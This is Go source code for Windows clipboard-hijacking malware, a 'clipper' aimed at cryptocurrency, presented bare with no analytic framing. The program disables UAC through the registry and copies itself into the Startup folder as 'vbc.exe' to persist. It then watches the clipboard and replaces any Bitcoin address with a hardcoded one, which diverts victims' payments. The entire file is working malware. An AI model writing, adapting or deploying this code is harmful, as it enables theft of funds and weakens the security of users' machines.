package main

import (
	"github.com/atotto/clipboard"
	"github.com/kardianos/osext"
	"golang.org/x/sys/windows/registry"
	"io"
	"log"
	"os"
	"regexp"
	"strings"
	"time"
)

func main () {

	epic, _ := osext.Executable()

	if strings.Contains(epic, "Start Menu\\Programs\\StartUp") == false {

		// DISABLE UAC (IF NEEDED)
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, registry.QUERY_VALUE|registry.SET_VALUE)
		if err != nil {
		    log.Fatal(err)
		}
		s, _, err := k.GetIntegerValue("EnableLUA")
		if s != 0 {
			if err := k.SetDWordValue("EnableLUA", 0); err != nil {
		    	log.Fatal(err)
			}
		}
		if err := k.Close(); err != nil {
		    log.Fatal(err)
		}
		

		// COPY FILE TO STARTUP
		from, err := os.Open(epic)
		if err != nil {
			log.Fatal(err)
		}
		defer from.Close()

		to, err := os.OpenFile("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbc.exe", os.O_RDWR|os.O_CREATE, 0666)
		if err != nil {
			log.Fatal(err)
		}
		defer to.Close()

		_, err = io.Copy(to,from)
		if err != nil {
			log.Fatal(err)
		}
	}

	for {
		clipData, _ := clipboard.ReadAll()
		matchedExp, _ := regexp.MatchString("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",clipData)

		if matchedExp == true && clipData != "1ABY48XNRnpvk5c6t3ero4w6Zyhyhsh1S4" {
			clipboard.WriteAll("1ABY48XNRnpvk5c6t3ero4w6Zyhyhsh1S4")
		}

		time.Sleep(1 * time.Second)
	}
}
